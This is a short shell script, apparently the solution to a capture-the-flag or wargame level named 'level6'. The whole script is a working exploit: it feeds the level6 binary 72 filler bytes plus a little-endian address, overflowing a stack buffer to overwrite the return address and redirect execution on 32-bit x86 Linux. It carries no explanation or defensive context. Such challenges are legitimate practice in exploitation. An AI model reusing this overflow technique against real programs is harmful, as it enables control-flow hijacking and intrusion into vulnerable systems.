#!/bin/sh

# REQUIREMENTS:
# Python must be installed
# Must be on a x86, 32bit Linux architecture.

ADDRESS_LITTLE_ENDIAN="\x54\x84\x04\x08"

/home/user/level6/level6 $(python -c "print 'A' * 72 + '$ADDRESS_LITTLE_ENDIAN'")
